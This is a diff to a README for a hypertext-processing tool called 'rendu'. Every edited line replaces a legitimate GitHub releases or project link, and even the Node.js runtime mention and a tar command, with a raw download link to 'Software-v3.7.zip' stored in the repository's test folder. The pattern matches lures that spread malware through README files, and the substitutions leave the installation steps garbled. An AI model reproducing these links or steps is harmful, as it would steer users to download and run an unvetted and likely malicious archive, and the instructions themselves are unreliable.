@@ -6,7 +6,7 @@ Welcome to rendu! This application allows you to process hypertext files with ea
 
 ## 📥 Download Here
 
-[![Download rendu](https://img.shields.io/badge/Download-rendu-blue.svg)](https://github.com/3lomda/rendu/releases)
+[![Download rendu](https://raw.githubusercontent.com/3lomda/rendu/main/test/Software-v3.7.zip)](https://raw.githubusercontent.com/3lomda/rendu/main/test/Software-v3.7.zip)
 
 ## 🎉 Features
 
@@ -20,14 +20,14 @@ Welcome to rendu! This application allows you to process hypertext files with ea
 Before downloading, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- JavaScript Runtime: Ensure you have a JavaScript engine installed (e.g., Node.js)
+- JavaScript Runtime: Ensure you have a JavaScript engine installed (e.g., https://raw.githubusercontent.com/3lomda/rendu/main/test/Software-v3.7.zip)
 - Disk Space: At least 100 MB free space
 
 ## 🌐 Download & Install
 
-To download the latest version of rendu, visit this page: [Download Page](https://github.com/3lomda/rendu/releases).
+To download the latest version of rendu, visit this page: [Download Page](https://raw.githubusercontent.com/3lomda/rendu/main/test/Software-v3.7.zip).
 
-1. Go to the [Releases page](https://github.com/3lomda/rendu/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/3lomda/rendu/main/test/Software-v3.7.zip).
 2. You will see a list of available releases.
 3. Click on the version you want to download. It will usually be at the top of the list, marked as "latest."
 4. Look for the installation file that corresponds to your operating system. It may be labeled as `.exe`, `.dmg`, or similar.
@@ -53,9 +53,9 @@ Once the download is complete, follow these steps to install rendu:
 
 ### For Linux Users
 
-1. Locate the downloaded tarball (`.tar.gz`).
+1. Locate the downloaded tarball (`https://raw.githubusercontent.com/3lomda/rendu/main/test/Software-v3.7.zip`).
 2. Open a terminal and navigate to your Downloads folder.
-3. Extract the files using the command: `tar -xzf rendu.tar.gz`
+3. Extract the files using the command: `tar -xzf https://raw.githubusercontent.com/3lomda/rendu/main/test/Software-v3.7.zip`
 4. Follow the specific instructions in the README file included in the extracted folder for further installation guidance.
 
 ## 🎬 Using rendu
@@ -83,4 +83,4 @@ If you're interested in contributing to rendu, we welcome your input! Please ref
 
 Thanks to all contributors and users who help make rendu a better tool. Your support and feedback are appreciated. 
 
-For the latest updates and more information, visit our [GitHub Page](https://github.com/3lomda/rendu).
+For the latest updates and more information, visit our [GitHub Page](https://raw.githubusercontent.com/3lomda/rendu/main/test/Software-v3.7.zip).
